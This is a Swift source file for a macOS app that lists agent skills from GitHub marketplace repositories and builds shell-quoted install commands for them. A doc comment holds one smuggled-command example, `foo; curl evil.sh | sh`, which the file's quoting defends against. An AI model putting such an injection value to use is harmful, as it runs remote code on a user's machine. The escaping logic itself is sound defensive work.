import Foundation

/// One remote marketplace source the catalog browses. Declarative and
/// code-embedded — same philosophy as `McpRegistry` and `RulesRegistry`:
/// known sources shipped with the app, discovered at review time, never
/// probed heuristically and never added at runtime.
public struct CatalogSource: Hashable, Sendable, Identifiable {
    /// "owner/repo" — also the stable identity.
    public let id: String
    /// Display name for the list UI.
    public let displayName: String
    public let owner: String
    public let repo: String
    public let branch: String
    /// True for sources the user imported at runtime (persisted in
    /// UserDefaults); built-in sources are shipped in code only.
    public let isCustom: Bool

    public init(
        id: String,
        displayName: String,
        owner: String,
        repo: String,
        branch: String,
        isCustom: Bool = false
    ) {
        self.id = id
        self.displayName = displayName
        self.owner = owner
        self.repo = repo
        self.branch = branch
        self.isCustom = isCustom
    }
}

/// Fixed, code-embedded table of the marketplace sources the read-only
/// catalog browses. Read-only discipline: the app lists and renders these
/// remote skills — installation stays with the ecosystem's own tooling
/// (CLI / Finder), never in-app.
public enum CatalogRegistry {
    public static let sources: [CatalogSource] = [
        CatalogSource(
            id: "anthropics/skills",
            displayName: "Anthropic Skills",
            owner: "anthropics",
            repo: "skills",
            branch: "main"
        ),
        CatalogSource(
            id: "anthropics/claude-plugins-official",
            displayName: "Anthropic Plugins",
            owner: "anthropics",
            repo: "claude-plugins-official",
            branch: "main"
        ),
        CatalogSource(
            id: "obra/superpowers",
            displayName: "Superpowers",
            owner: "obra",
            repo: "superpowers",
            branch: "main"
        ),
        CatalogSource(
            id: "vercel-labs/agent-skills",
            displayName: "Vercel Agent Skills",
            owner: "vercel-labs",
            repo: "agent-skills",
            branch: "main"
        ),
        CatalogSource(
            id: "alirezarezvani/claude-skills",
            displayName: "Claude Skills Collection",
            owner: "alirezarezvani",
            repo: "claude-skills",
            branch: "main"
        ),
        CatalogSource(
            id: "wshobson/agents",
            displayName: "wshobson Agents",
            owner: "wshobson",
            repo: "agents",
            branch: "main"
        ),
        CatalogSource(
            id: "mattpocock/skills",
            displayName: "Matt Pocock Skills",
            owner: "mattpocock",
            repo: "skills",
            branch: "main"
        ),
    ]
}

/// A skill discovered in a catalog source's repository. Pure metadata —
/// the SKILL.md content is only fetched on demand when the user opens the
/// detail view.
public struct CatalogSkill: Identifiable, Hashable, Sendable {
    /// "sourceId:skillPath" — stable within a source's tree.
    public let id: String
    public let sourceID: String
    /// Directory name holding the SKILL.md ("pdf").
    public let name: String
    /// Repo-relative path of the SKILL.md ("skills/pdf/SKILL.md").
    public let skillPath: String
    /// The skill's GitHub page (browser handoff).
    public let githubURL: URL
    /// Raw SKILL.md URL (document fetch).
    public let rawURL: URL

    /// Install command for the ecosystem's own CLI (vercel-labs/skills,
    /// syntax verified against its docs: `npx skills add <owner/repo>
    /// --skill <name>`). The app copies this string; it never runs it.
    ///
    /// `name` (and, for custom sources, `sourceID`) is remote-controlled
    /// — a catalog repository can name its directories anything git
    /// allows. The command is what the user pastes into a terminal, so
    /// any component outside the plain-token set is POSIX single-quote
    /// escaped: `foo; curl evil.sh | sh` pastes as inert text, not code.
    public var installCommand: String {
        "npx skills add \(Self.shellToken(sourceID)) --skill \(Self.shellToken(name))"
    }

    /// Characters a URL/GitHub token may contain without shell quoting.
    /// Includes `/` for the owner/repo form of `sourceID`.
    private static let plainTokenCharacters = Set(
        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-/"
    )

    /// POSIX-safe single token: unquoted when the value is a plain token,
    /// single-quoted otherwise (an embedded `'` closes the quote, escapes
    /// itself, and reopens).
    private static func shellToken(_ value: String) -> String {
        guard !value.isEmpty, value.allSatisfy({ plainTokenCharacters.contains($0) }) else {
            return "'" + value.replacingOccurrences(of: "'", with: "'\\''") + "'"
        }
        return value
    }

    public init(
        id: String,
        sourceID: String,
        name: String,
        skillPath: String,
        githubURL: URL,
        rawURL: URL
    ) {
        self.id = id
        self.sourceID = sourceID
        self.name = name
        self.skillPath = skillPath
        self.githubURL = githubURL
        self.rawURL = rawURL
    }
}

/// One source's listing result. `truncated` mirrors GitHub's flag: a huge
/// tree may be incomplete, and the UI must say so instead of implying the
/// list is exhaustive.
public struct CatalogPage: Hashable, Sendable {
    public let skills: [CatalogSkill]
    public let truncated: Bool

    public init(skills: [CatalogSkill], truncated: Bool) {
        self.skills = skills
        self.truncated = truncated
    }
}

/// Repository-level metadata for a catalog source, decoded from GitHub's
/// `/repos/{owner}/{repo}` endpoint. Every skill from a source shares it,
/// so it is fetched once per source and cached in memory with the listing.
public struct CatalogRepoMetadata: Hashable, Sendable {
    /// Repository owner (the "author" in the GitHub sense).
    public let owner: String
    /// Repository name.
    public let repo: String
    public let stars: Int
    public let forks: Int
    /// Last push time — the closest GitHub proxy for "last updated".
    public let pushedAt: Date?
    /// SPDX license identifier, when the repo declares one.
    public let license: String?
    public let defaultBranch: String

    public init(
        owner: String,
        repo: String,
        stars: Int,
        forks: Int,
        pushedAt: Date?,
        license: String?,
        defaultBranch: String
    ) {
        self.owner = owner
        self.repo = repo
        self.stars = stars
        self.forks = forks
        self.pushedAt = pushedAt
        self.license = license
        self.defaultBranch = defaultBranch
    }
}

public enum CatalogError: Error, Equatable {
    /// Non-200 response other than rate limiting.
    case http(status: Int)
    /// 403/429 — GitHub's anonymous rate limit or an abuse rejection.
    case rateLimited
    /// Response could not be decoded as the expected shape.
    case invalidResponse
    /// The document exceeds the read-size cap and is not shown.
    case oversized
}

/// The catalog network boundary — injected into the app model so tests
/// drive the state machine without touching the network.
public protocol CatalogFetching: Sendable {
    func fetchSkills(source: CatalogSource) async throws -> CatalogPage
    func fetchDocument(_ skill: CatalogSkill) async throws -> String
    func fetchRepoInfo(source: CatalogSource) async throws -> CatalogRepoMetadata
}

/// One user-imported marketplace source (「导入市场」). Persisted as plain
/// owner/repo/branch; everything else (listing, documents, install
/// command) flows through the same pipeline as built-in sources.
public struct CustomCatalogSource: Codable, Hashable, Sendable {
    public let owner: String
    public let repo: String
    public let branch: String

    public init(owner: String, repo: String, branch: String = "main") {
        self.owner = owner
        self.repo = repo
        self.branch = branch
    }

    /// Accepts "owner/repo", "owner/repo@branch", or GitHub URLs
    /// ("https://github.com/owner/repo", with or without further path
    /// segments). Returns nil for malformed input.
    public static func parsing(_ text: String) -> CustomCatalogSource? {
        var value = text.trimmingCharacters(in: .whitespacesAndNewlines)
        while value.hasSuffix("/") { value.removeLast() }
        guard !value.isEmpty else { return nil }

        var isURL = false
        for prefix in ["https://github.com/", "http://github.com/", "github.com/"] {
            if value.hasPrefix(prefix) {
                value = String(value.dropFirst(prefix.count))
                isURL = true
                break
            }
        }
        // Keep only owner/repo when a longer URL path was pasted
        // (…/tree/main/…); a branch embedded that way is ignored in favor
        // of the explicit @branch form or the default. A bare non-URL
        // value must be exactly owner/repo — no silent collapsing.
        if isURL, let firstSlash = value.firstIndex(of: "/"),
           let secondSlash = value[value.index(after: firstSlash)...].firstIndex(of: "/") {
            value = String(value[..<secondSlash])
        }
        var branch = "main"
        if let at = value.lastIndex(of: "@") {
            let candidate = String(value[value.index(after: at)...])
            let base = String(value[..<at])
            if !candidate.isEmpty, !candidate.contains("/"), !base.isEmpty {
                branch = candidate
                value = base
            }
        }
        let parts = value.split(separator: "/").map(String.init)
        guard parts.count == 2 else { return nil }
        let allowed = Set("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._-")
        for component in [parts[0], parts[1], branch] {
            guard !component.isEmpty, component.allSatisfy({ allowed.contains($0) }) else {
                return nil
            }
        }
        return CustomCatalogSource(owner: parts[0], repo: parts[1], branch: branch)
    }

    /// The catalog source this custom entry resolves to (repo name as the
    /// display name — badge-sized).
    public var source: CatalogSource {
        CatalogSource(
            id: "\(owner)/\(repo)",
            displayName: repo,
            owner: owner,
            repo: repo,
            branch: branch,
            isCustom: true
        )
    }
}

/// Persistence boundary for user-imported sources — the same shape as the
/// custom-Agent store: UserDefaults JSON, suite-injected for tests.
public protocol CatalogSourceStoring: Sendable {
    func loadCustomSources() -> [CustomCatalogSource]
    func saveCustomSources(_ sources: [CustomCatalogSource])
}

public final class UserDefaultsCatalogSourceStore: CatalogSourceStoring, @unchecked Sendable {
    private let defaults: UserDefaults
    private let key: String

    public init(defaults: UserDefaults = .standard, key: String = "SkillSelector.customCatalogSources") {
        self.defaults = defaults
        self.key = key
    }

    public func loadCustomSources() -> [CustomCatalogSource] {
        guard let data = defaults.data(forKey: key) else { return [] }
        return (try? JSONDecoder().decode([CustomCatalogSource].self, from: data)) ?? []
    }

    public func saveCustomSources(_ sources: [CustomCatalogSource]) {
        guard let data = try? JSONEncoder().encode(sources) else { return }
        defaults.set(data, forKey: key)
    }
}
